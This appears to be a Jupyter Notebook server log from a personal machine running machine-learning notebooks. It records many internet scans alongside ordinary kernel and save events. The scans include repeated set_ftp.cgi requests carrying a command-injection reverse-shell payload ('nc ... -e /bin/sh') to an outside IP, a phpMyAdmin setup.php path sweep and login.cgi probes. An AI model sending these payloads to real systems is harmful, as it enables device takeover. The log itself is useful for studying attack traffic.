+[W 13:20:39.954 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 5.16ms referer=None
+[I 13:21:57.390 NotebookApp] 302 GET / (165.228.8.197) 1.86ms
+[I 13:39:27.649 NotebookApp] 302 GET / (167.248.133.52) 1.94ms
+[I 13:39:28.047 NotebookApp] 302 GET / (167.248.133.52) 1.82ms
+[I 13:39:28.470 NotebookApp] 302 GET /tree (167.248.133.52) 2.77ms
+[W 13:39:31.211 NotebookApp] 405 CONNECT ip.ws.126.net:443 (222.186.136.150) 7.06ms referer=None
+[I 17:25:14.875 NotebookApp] 302 GET / (162.142.125.36) 1.88ms
+[I 17:25:15.287 NotebookApp] 302 GET / (162.142.125.36) 1.81ms
+[I 17:25:15.701 NotebookApp] 302 GET /tree (162.142.125.36) 2.67ms
+[I 17:35:53.578 NotebookApp] 302 GET / (80.82.77.139) 2.06ms
+[I 17:35:54.121 NotebookApp] 302 GET /tree (80.82.77.139) 2.63ms
+[I 17:36:01.833 NotebookApp] 302 GET / (34.76.17.151) 2.05ms
+[I 18:20:16.519 NotebookApp] 302 GET / (172.104.67.101) 2.42ms
+[I 19:10:59.867 NotebookApp] 302 GET / (117.111.18.89) 2.04ms
+[W 19:18:42.679 NotebookApp] 404 GET http://example.com/ (185.39.11.105) 6.40ms referer=None
+[W 19:43:00.240 NotebookApp] 404 GET login.cgi (2.57.122.185) 6.41ms referer=None
+[W 19:43:10.577 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.84ms referer=None
+[W 19:43:10.912 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.49ms referer=None
+[W 19:43:11.602 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.03ms referer=None
+[W 19:43:11.930 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.43ms referer=None
+[W 19:43:12.610 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.31ms referer=None
+[W 19:43:12.949 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.65ms referer=None
+[W 19:43:13.636 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.70ms referer=None
+[W 19:43:13.973 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 5.29ms referer=None
+[W 19:43:14.665 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.88ms referer=None
+[W 19:43:14.996 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.32ms referer=None
+[I 21:31:51.598 NotebookApp] 302 GET / (27.22.249.17) 2.24ms
+[I 21:31:51.669 NotebookApp] 302 GET /tree? (27.22.249.17) 2.55ms
+[W 22:27:11.774 NotebookApp] 404 GET login.cgi (5.189.143.170) 6.33ms referer=None
+[I 22:33:41.762 NotebookApp] 302 GET / (74.120.14.51) 1.87ms
+[I 22:33:42.148 NotebookApp] 302 GET / (74.120.14.51) 1.89ms
+[I 22:33:42.646 NotebookApp] 302 GET /tree (74.120.14.51) 2.42ms
+[W 22:56:19.506 NotebookApp] 404 GET login.cgi (5.189.143.170) 2.90ms referer=None
+[W 23:13:49.567 NotebookApp] 404 GET login.cgi (2.57.122.185) 6.22ms referer=None
+[W 23:13:59.904 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.00ms referer=None
+[W 23:14:00.248 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.27ms referer=None
+[W 23:14:00.932 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.93ms referer=None
+[W 23:14:01.266 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.29ms referer=None
+[W 23:14:01.951 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.84ms referer=None
+[W 23:14:02.298 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.42ms referer=None
+[W 23:14:02.984 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.90ms referer=None
+[W 23:14:03.323 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.47ms referer=None
+[W 23:14:03.996 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.90ms referer=None
+[W 23:14:04.325 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.33ms referer=None
+[W 00:35:04.531 NotebookApp] 404 GET login.cgi (5.189.143.170) 6.36ms referer=None
+[W 01:09:16.186 NotebookApp] 404 GET login.cgi (104.244.78.139) 7.70ms referer=None
+[I 01:51:29.525 NotebookApp] 302 GET / (103.224.200.40) 1.92ms
+[I 02:07:07.642 NotebookApp] 302 GET / (185.39.11.105) 2.18ms
+[I 02:51:42.183 NotebookApp] 302 GET / (59.127.158.118) 1.89ms
+[I 03:08:19.742 NotebookApp] 302 GET / (106.113.159.118) 1.87ms
+[W 03:20:42.105 NotebookApp] 404 GET login.cgi (167.86.79.47) 6.14ms referer=None
+[I 03:43:46.952 NotebookApp] 302 GET / (185.39.11.105) 2.17ms
+[I 04:17:56.323 NotebookApp] 302 GET / (117.111.18.89) 1.88ms
+[I 05:33:42.761 NotebookApp] 302 GET / (211.47.112.16) 2.08ms
+[I 05:37:15.734 NotebookApp] 302 GET / (178.168.89.56) 1.88ms
+[W 06:31:15.143 NotebookApp] 404 GET login.cgi (5.189.143.170) 6.34ms referer=None
+[I 07:31:58.813 NotebookApp] 302 GET / (185.92.24.22) 1.89ms
+[W 08:46:36.773 NotebookApp] 404 GET login.cgi (5.189.143.170) 6.35ms referer=None
+[W 09:23:37.367 NotebookApp] 404 GET /phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php (89.248.174.203) 6.18ms referer=None
+[W 09:23:38.132 NotebookApp] 404 GET /phpMyAdmin-2.10.0.0/scripts/setup.php (89.248.174.203) 6.22ms referer=None
+[W 09:23:38.724 NotebookApp] 404 GET /phpMyAdmin-2.11.11/scripts/setup.php (89.248.174.203) 6.19ms referer=None
+[W 09:23:39.439 NotebookApp] 404 GET /phpMyAdmin-2.11.11.3/scripts/setup.ph (89.248.174.203) 6.17ms referer=None
+[W 09:23:40.079 NotebookApp] 404 GET /phpMyAdmin-2/scripts/setup.php (89.248.174.203) 6.20ms referer=None
+[W 09:23:40.683 NotebookApp] 404 GET /my/scripts/setup.php (89.248.174.203) 6.23ms referer=None
+[W 09:23:41.613 NotebookApp] 404 GET /MyAdmin/scripts/setup.php (89.248.174.203) 6.17ms referer=None
+[W 09:23:42.269 NotebookApp] 404 GET /PHPMYADMIN/scripts/setup.php (89.248.174.203) 6.20ms referer=None
+[W 09:23:42.842 NotebookApp] 404 GET /db/scripts/setup.php (89.248.174.203) 6.23ms referer=None
+[W 09:23:43.402 NotebookApp] 404 GET /dbadmin/scripts/setup.php (89.248.174.203) 6.41ms referer=None
+[W 09:23:44.030 NotebookApp] 404 GET /myadmin/scripts/setup.php (89.248.174.203) 6.21ms referer=None
+[W 09:23:44.656 NotebookApp] 404 GET /mysql/scripts/setup.php (89.248.174.203) 6.12ms referer=None
+[W 09:23:45.323 NotebookApp] 404 GET /mysqladmin/scripts/setup.php (89.248.174.203) 6.29ms referer=None
+[W 09:23:45.969 NotebookApp] 404 GET /pHpMyAdMiN/scripts/setup.php (89.248.174.203) 6.21ms referer=None
+[W 09:23:46.679 NotebookApp] 404 GET /phpMyAdmin/scripts/setup.php (89.248.174.203) 6.20ms referer=None
+[W 09:23:47.326 NotebookApp] 404 GET /phpadmin/scripts/setup.php (89.248.174.203) 6.17ms referer=None
+[W 09:23:47.906 NotebookApp] 404 GET /phpmyadmin/scripts/setup.php (89.248.174.203) 6.13ms referer=None
+[W 09:23:48.940 NotebookApp] 404 GET /sqladm/scripts/setup.php (89.248.174.203) 6.25ms referer=None
+[W 09:23:49.689 NotebookApp] 404 GET /sqladmin/scripts/setup.php (89.248.174.203) 6.28ms referer=None
+[W 09:23:50.294 NotebookApp] 404 GET /phpmyadmin/scripts/db.init.php (89.248.174.203) 6.17ms referer=None
+[W 09:23:51.031 NotebookApp] 404 GET /phpMyAdmin/scripts/db.init.php (89.248.174.203) 6.20ms referer=None
+[W 09:23:51.729 NotebookApp] 404 GET /MyAdmin/scripts/setup.php (89.248.174.203) 6.19ms referer=None
+[W 09:23:52.740 NotebookApp] 404 GET /database/scripts/setup.php (89.248.174.203) 6.21ms referer=None
+[W 09:23:53.353 NotebookApp] 404 GET /phpAdmin/scripts/setup.php (89.248.174.203) 6.18ms referer=None
+[W 09:23:53.972 NotebookApp] 404 GET /phpmyadmin1/scripts/setup.php (89.248.174.203) 6.24ms referer=None
+[W 09:23:54.583 NotebookApp] 404 GET /phpmyadmin2/scripts/setup.php (89.248.174.203) 6.43ms referer=None
+[W 09:23:55.174 NotebookApp] 404 GET /pma/scripts/setup.php (89.248.174.203) 6.12ms referer=None
+[W 09:23:55.818 NotebookApp] 404 GET /scripts/setup.php (89.248.174.203) 5.00ms referer=None
+[W 09:23:56.570 NotebookApp] 404 GET /setup.php (89.248.174.203) 6.31ms referer=None
+[I 11:42:31.808 NotebookApp] 302 GET / (122.116.211.9) 1.89ms
+[W 12:29:06.395 NotebookApp] 404 GET login.cgi (104.244.78.139) 6.12ms referer=None
+[I 12:56:05.002 NotebookApp] 302 GET / (185.39.11.105) 2.18ms
+[W 13:28:52.978 NotebookApp] 404 GET login.cgi (2.57.122.193) 6.42ms referer=None
+[I 13:50:04.114 NotebookApp] 302 GET / (117.50.5.94) 2.27ms
+[I 13:50:04.276 NotebookApp] 302 GET / (120.52.152.20) 2.34ms
+[I 13:50:04.375 NotebookApp] 302 GET /tree? (120.52.152.20) 2.97ms
+[I 16:05:39.149 NotebookApp] 302 GET / (192.168.123.104) 1.96ms
+[I 17:44:38.769 NotebookApp] 302 GET / (24.236.111.248) 2.09ms
+[W 18:19:22.538 NotebookApp] 404 GET /ftptest.cgi (2.57.122.193) 6.32ms referer=None
+[I 19:59:56.786 NotebookApp] 302 GET / (167.248.133.51) 1.56ms
+[I 19:59:57.180 NotebookApp] 302 GET / (167.248.133.51) 2.08ms
+[I 19:59:57.570 NotebookApp] 302 GET /tree (167.248.133.51) 2.86ms
+[W 20:09:33.127 NotebookApp] 404 GET login.cgi (103.145.13.109) 6.10ms referer=None
+[W 20:09:43.452 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+112.49.52.58+1245+-e+%2Fbin%2Fsh%29 (103.145.13.109) 6.28ms referer=None
+[W 20:09:43.794 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.54ms referer=None
+[W 20:09:44.732 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 5.30ms referer=None
+[W 20:09:45.381 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+112.49.52.58+1245+-e+%2Fbin%2Fsh%29 (103.145.13.109) 7.02ms referer=None
+[W 20:09:45.689 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.78ms referer=None
+[W 20:09:46.320 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+112.49.52.58+1245+-e+%2Fbin%2Fsh%29 (103.145.13.109) 5.92ms referer=None
+[W 20:09:46.632 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.64ms referer=None
+[W 20:09:47.275 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+112.49.52.58+1245+-e+%2Fbin%2Fsh%29 (103.145.13.109) 7.11ms referer=None
+[W 20:09:47.580 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 5.44ms referer=None
+[I 20:58:19.556 NotebookApp] 302 GET / (79.53.115.234) 1.90ms
+[I 21:20:13.904 NotebookApp] 302 GET / (114.34.38.11) 1.88ms
+[W 21:20:23.997 NotebookApp] 404 GET login.cgi (5.189.143.170) 6.08ms referer=None
+[W 22:01:07.858 NotebookApp] 404 GET login.cgi (5.189.143.170) 6.28ms referer=None
+[I 23:30:10.724 NotebookApp] 302 GET / (71.229.103.166) 1.89ms
+[W 00:09:09.300 NotebookApp] 404 GET login.cgi (185.239.242.16) 6.22ms referer=None
+[W 01:10:10.915 NotebookApp] 404 GET login.cgi (2.57.122.185) 6.11ms referer=None
+[W 01:10:21.247 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.92ms referer=None
+[W 01:10:21.570 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.54ms referer=None
+[W 01:10:22.252 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.99ms referer=None
+[W 01:10:22.595 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.44ms referer=None
+[W 01:10:23.286 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.90ms referer=None
+[W 01:10:23.621 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 4.26ms referer=None
+[W 01:10:24.326 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 5.86ms referer=None
+[W 01:10:24.670 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.59ms referer=None
+[W 01:10:25.358 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 3.89ms referer=None
+[W 01:10:25.697 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.39ms referer=None
+[I 01:47:12.867 NotebookApp] 302 GET / (120.7.85.100) 1.87ms
+[I 02:28:55.846 NotebookApp] 302 GET / (2.55.125.182) 1.88ms
+[W 03:57:02.647 NotebookApp] 405 CONNECT ip.ws.126.net:443 (222.186.136.150) 6.63ms referer=None
+[I 03:58:54.838 NotebookApp] 302 GET / (117.111.18.169) 1.95ms
+[W 04:16:55.934 NotebookApp] 404 GET login.cgi (103.145.13.109) 6.36ms referer=None
+[W 04:17:06.624 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.73ms referer=None
+[W 04:17:07.257 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+112.49.52.58+1245+-e+%2Fbin%2Fsh%29 (103.145.13.109) 7.05ms referer=None
+[W 04:17:07.626 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 5.37ms referer=None
+[W 04:17:08.303 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+112.49.52.58+1245+-e+%2Fbin%2Fsh%29 (103.145.13.109) 7.01ms referer=None
+[W 04:17:08.586 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.40ms referer=None
+[W 04:17:09.232 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+112.49.52.58+1245+-e+%2Fbin%2Fsh%29 (103.145.13.109) 6.97ms referer=None
+[W 04:17:09.538 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.26ms referer=None
+[W 04:17:10.189 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+112.49.52.58+1245+-e+%2Fbin%2Fsh%29 (103.145.13.109) 7.30ms referer=None
+[W 04:17:10.506 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.37ms referer=None
+[I 05:02:27.242 NotebookApp] 302 GET / (103.218.161.37) 1.90ms
+[I 05:20:45.921 NotebookApp] 302 GET / (103.218.161.37) 1.86ms
+[C 05:26:45.126 NotebookApp] received signal 15, stopping
+[I 05:26:45.127 NotebookApp] Shutting down 0 kernels
+[I 05:26:45.127 NotebookApp] Shutting down 0 terminals
+[I 05:35:29.895 NotebookApp] Serving notebooks from local directory: /home/kqr/2020/KOSPI_AI_Model
+[I 05:35:29.896 NotebookApp] Jupyter Notebook 6.1.4 is running at:
+[I 05:35:29.896 NotebookApp] http://zerohertz-pi:8889/
+[I 05:35:29.896 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
+[I 05:39:34.270 NotebookApp] Creating new notebook in 
+[I 05:39:36.565 NotebookApp] Kernel started: a976861b-b3d5-4e0f-829b-421e09536695, name: kqr
+[I 05:39:58.065 NotebookApp] Kernel started: 52244e41-1226-4e89-80c3-174f72321461, name: kqr
+[I 05:41:36.524 NotebookApp] Saving file at /Non-linear_SVM.ipynb
+[I 05:43:36.531 NotebookApp] Saving file at /Non-linear_SVM.ipynb
+[I 05:45:36.524 NotebookApp] Saving file at /Non-linear_SVM.ipynb
+[I 05:46:19.125 NotebookApp] Kernel shutdown: a976861b-b3d5-4e0f-829b-421e09536695
+[W 05:46:19.837 NotebookApp] delete /Non-linear_SVM.ipynb
+[W 05:46:19.902 NotebookApp] 404 DELETE /api/sessions/02e8b56a-84d3-4fed-a4c3-5e24db9f15c7 (103.218.161.37): Session not found: session_id='02e8b56a-84d3-4fed-a4c3-5e24db9f15c7'
+[W 05:46:19.903 NotebookApp] Session not found: session_id='02e8b56a-84d3-4fed-a4c3-5e24db9f15c7'
+[W 05:46:19.903 NotebookApp] 404 DELETE /api/sessions/02e8b56a-84d3-4fed-a4c3-5e24db9f15c7 (103.218.161.37) 2.59ms referer=http://zerohertz.xyz:81/notebooks/Non-linear_SVM.ipynb
+[I 05:46:21.479 NotebookApp] Kernel shutdown: 52244e41-1226-4e89-80c3-174f72321461
+[W 05:46:21.955 NotebookApp] 404 DELETE /api/sessions/f7e52985-b054-422c-a3a7-26cbcadbb980 (103.218.161.37): Session not found: session_id='f7e52985-b054-422c-a3a7-26cbcadbb980'
+[W 05:46:21.956 NotebookApp] Session not found: session_id='f7e52985-b054-422c-a3a7-26cbcadbb980'
+[W 05:46:21.956 NotebookApp] 404 DELETE /api/sessions/f7e52985-b054-422c-a3a7-26cbcadbb980 (103.218.161.37) 2.52ms referer=http://zerohertz.xyz:81/notebooks/Random_Forest.ipynb
+[W 05:46:31.530 NotebookApp] 404 GET /api/contents/Non-linear_SVM.ipynb?content=0&_=1603082375259 (103.218.161.37): No such file or directory: Non-linear_SVM.ipynb
+[W 05:46:31.531 NotebookApp] No such file or directory: Non-linear_SVM.ipynb
+[W 05:46:31.532 NotebookApp] 404 GET /api/contents/Non-linear_SVM.ipynb?content=0&_=1603082375259 (103.218.161.37) 4.91ms referer=http://zerohertz.xyz:81/notebooks/Non-linear_SVM.ipynb
+[W 05:52:05.399 NotebookApp] 404 GET login.cgi (2.57.122.185) 49.02ms referer=None
+[W 05:52:15.692 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 8.69ms referer=None
+[W 05:52:16.020 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.43ms referer=None
+[W 05:52:16.707 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.82ms referer=None
+[W 05:52:17.037 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.28ms referer=None
+[W 05:52:17.726 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.66ms referer=None
+[W 05:52:18.058 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.17ms referer=None
+[W 05:52:18.740 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.90ms referer=None
+[W 05:52:19.074 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.27ms referer=None
+[W 05:52:19.754 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.72ms referer=None
+[W 05:52:20.105 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.25ms referer=None
+[W 07:06:28.606 NotebookApp] 404 GET login.cgi (185.239.242.16) 6.27ms referer=None
+[I 07:43:46.806 NotebookApp] 302 GET / (164.52.24.182) 1.90ms
+[W 07:48:46.908 NotebookApp] 404 GET login.cgi (2.57.122.185) 6.37ms referer=None
+[W 07:48:57.239 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.00ms referer=None
+[W 07:48:57.580 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.51ms referer=None
+[W 07:48:58.282 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.94ms referer=None
+[W 07:48:58.641 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.45ms referer=None
+[W 07:48:59.340 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.94ms referer=None
+[W 07:48:59.683 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 4.02ms referer=None
+[W 07:49:00.366 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 4.97ms referer=None
+[W 07:49:00.729 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.46ms referer=None
+[W 07:49:01.442 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.99ms referer=None
+[W 07:49:01.766 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.26ms referer=None
+[I 08:00:25.210 NotebookApp] 302 GET / (117.111.18.169) 1.84ms
+[I 08:04:23.825 NotebookApp] 302 GET / (103.218.161.37) 0.90ms
+[I 08:04:31.798 NotebookApp] Kernel started: 7fd76047-3fb3-43b7-bd3f-d3e5787cb256, name: kqr
+[I 08:04:33.215 NotebookApp] Creating new notebook in 
+[I 08:04:34.636 NotebookApp] Kernel started: 3ead1fe6-73cc-4aa6-9a0a-bd54c977e9b4, name: kqr
+[W 08:05:24.945 NotebookApp] 404 GET login.cgi (185.239.242.16) 7.48ms referer=None
+[I 08:06:34.634 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:08:34.656 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:10:34.651 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:12:34.656 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:14:34.642 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:16:34.656 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:16:42.358 NotebookApp] Saving file at /Random_Forest.ipynb
+[I 08:18:21.288 NotebookApp] Starting buffering for 3ead1fe6-73cc-4aa6-9a0a-bd54c977e9b4:9b6a60e1194941ce86e0f1e10e40f2ad
+[I 08:18:22.011 NotebookApp] Kernel restarted: 3ead1fe6-73cc-4aa6-9a0a-bd54c977e9b4
+[I 08:18:22.044 NotebookApp] Restoring connection for 3ead1fe6-73cc-4aa6-9a0a-bd54c977e9b4:9b6a60e1194941ce86e0f1e10e40f2ad
+[I 08:18:22.044 NotebookApp] Replaying 3 buffered messages
+[I 08:18:34.657 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:18:53.577 NotebookApp] Saving file at /Random_Forest.ipynb
+[I 08:18:56.639 NotebookApp] Starting buffering for 7fd76047-3fb3-43b7-bd3f-d3e5787cb256:520ac1c7253d4e888526f77ae3a51234
+[I 08:18:57.059 NotebookApp] Kernel restarted: 7fd76047-3fb3-43b7-bd3f-d3e5787cb256
+[I 08:18:57.086 NotebookApp] Restoring connection for 7fd76047-3fb3-43b7-bd3f-d3e5787cb256:520ac1c7253d4e888526f77ae3a51234
+[I 08:18:57.087 NotebookApp] Replaying 3 buffered messages
+[I 08:19:01.525 NotebookApp] Kernel started: d7b53733-b9d2-46e9-a80c-7e9032c96efc, name: kqr
+[I 08:19:44.860 NotebookApp] 302 GET / (96.69.95.138) 1.05ms
